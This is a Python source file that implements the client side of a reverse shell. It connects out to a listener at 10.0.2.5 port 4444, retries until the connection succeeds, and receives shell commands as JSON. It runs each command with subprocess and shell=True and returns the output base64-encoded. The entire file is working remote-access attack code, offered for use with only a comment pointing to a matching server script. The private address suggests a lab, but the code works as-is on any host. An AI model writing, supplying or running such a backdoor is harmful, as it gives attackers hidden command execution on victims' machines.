import socket
import json
import subprocess
import os
import base64
import time

def server_connect(ip, port):
    """Create a TCP socket and keep trying until the listener accepts."""
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)      # wait a few seconds and retry


def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:       # incomplete JSON – keep reading
            continue

def client_run():

    while True:
        data = receive()
        cmd = data.get("cmd", "")

        # graceful shutdown
        if cmd == "quit":
            print("[*] Server asked to quit – exiting.")
            break

        # handle cd command
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            try:
                os.chdir(path)
                out = ""            # cd normally produces no output
            except Exception as e:
                out = f"cd: {e}\n"
        else:
            # execute any other command
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            out_bytes = proc.communicate()[0]
            out = out_bytes.decode(errors="replace")

        # encode result and send back
        encoded = base64.b64encode(out.encode()).decode()
        send({"output": encoded})

if __name__ == "__main__":
    # Replace with the listener’s IP (the same IP you put in server.py)
    server_connect('10.0.2.5', 4444)   # <-- edit if needed
    client_run()
